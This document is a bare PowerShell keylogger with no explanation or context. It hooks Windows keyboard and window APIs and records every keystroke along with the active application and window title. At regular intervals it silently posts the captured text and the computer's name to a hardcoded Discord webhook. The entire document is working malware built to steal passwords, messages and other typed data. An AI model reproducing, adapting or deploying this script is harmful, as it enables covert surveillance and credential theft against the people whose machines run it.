$h="https://discord.com/api/webhooks/1442666694165135391/2B1EGQkG94a4swTJimgjXodryz5BxiT0SuTo7Y6s9XnZTvjLQdkd7Qyu3YTox9MKtMXW"
Add-Type @"
using System;using System.Runtime.InteropServices;
public class Win{ 
[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]public static extern int ToUnicode(uint wVirtKey,uint wScanCode,byte[] lpkeystate,[Out] System.Text.StringBuilder pwszBuff,int cchBuff,uint wFlags);
[DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]public static extern int GetWindowThreadProcessId(IntPtr hWnd,out int pid);
[DllImport("user32.dll")]public static extern int GetWindowText(IntPtr hWnd,System.Text.StringBuilder t,int n);
}"@
$w=New-Object System.Text.StringBuilder 256
$b=""
$r=""
$lw=""
$lt=[DateTime]::Now
while($true){
  Sleep -m 2
  $hw=[Win]::GetForegroundWindow()
  if($hw -ne [IntPtr]::Zero){
    $pid=0;[Win]::GetWindowThreadProcessId($hw,[ref]$pid)|Out-Null
    $pn="?";if($pid -gt 0){$pn=(Get-Process -Id $pid -ea 0).ProcessName}
    $w.Clear();[Win]::GetWindowText($hw,$w,256)|Out-Null
    $wt=$w.ToString()
    $winfo="$pn | $wt"
  }
  $mods=@()
  if([Win]::GetAsyncKeyState(17) -lt 0){$mods+="CTRL"}
  if([Win]::GetAsyncKeyState(16) -lt 0){$mods+="SHIFT"}
  if([Win]::GetAsyncKeyState(18) -lt 0){$mods+="ALT"}
  $mod=[string]::Join('+',$mods)
  for($k=8;$k -le 254;$k++){
    if([Win]::GetAsyncKeyState($k) -eq -32767){
      $txt=""
      switch($k){
        8{$txt="[BACK]"}
        9{$txt="[TAB]"}
        13{$txt="[ENT]"}
        27{$txt="[ESC]"}
        32{$txt=" "}
        46{$txt="[DEL]"}
        default{
          $sc=0
          $state=New-Object byte[] 256
          [Win]::GetKeyboardState($state)|Out-Null
          $sb=New-Object System.Text.StringBuilder 5
          if([Win]::ToUnicode($k,0,$state,$sb,$sb.Capacity,0)-gt0){$txt=$sb.ToString()}
        }
      }
      if($txt -ne ""){
        $r+=if($mod){ "[$mod+$txt]" }else{ $txt }
        if($k -eq 8){
          if($b.Length-gt0){$b=$b.Substring(0,$b.Length-1)}
        }elseif($txt.Length-eq1-and$txt-notmatch'\[.*\]'){
          $b+=$txt
        }
      }
    }
  }
  if($winfo -ne $lw -or ([DateTime]::Now-$lt).TotalSeconds -ge 10){
    if($r -ne "" -or $b -ne ""){
      $cl=@(3447003,15844367,3066993)[(Get-Random -Max 3)]
      $pc="Processed: $($b.Length) chars | Raw: $($r.Length) chars"
      $j=@{embeds=@(@{
        title="Key Log"
        description="`n**Window:** $winfo`n`n"
        color=$cl
        fields=@(
          @{name="Clean";value="```$($b)```";inline=$false}
          @{name="Raw";value="```$($r)```";inline=$false}
          @{name="Stats";value=$pc;inline=$true}
        )
        footer=@{text="$env:COMPUTERNAME | $(Get-Date -f 'MM/dd HH:mm')"}
        timestamp=(Get-Date).ToUniversalTime().ToString("o")
      })}|ConvertTo-Json -Depth 4 -Compress
      try{Invoke-RestMethod -Uri $h -Method Post -Body $j -ContentType 'application/json' -UseBasicParsing|Out-Null}catch{}
      $b="";$r=""
    }
    $lw=$winfo;$lt=[DateTime]::Now
  }
}
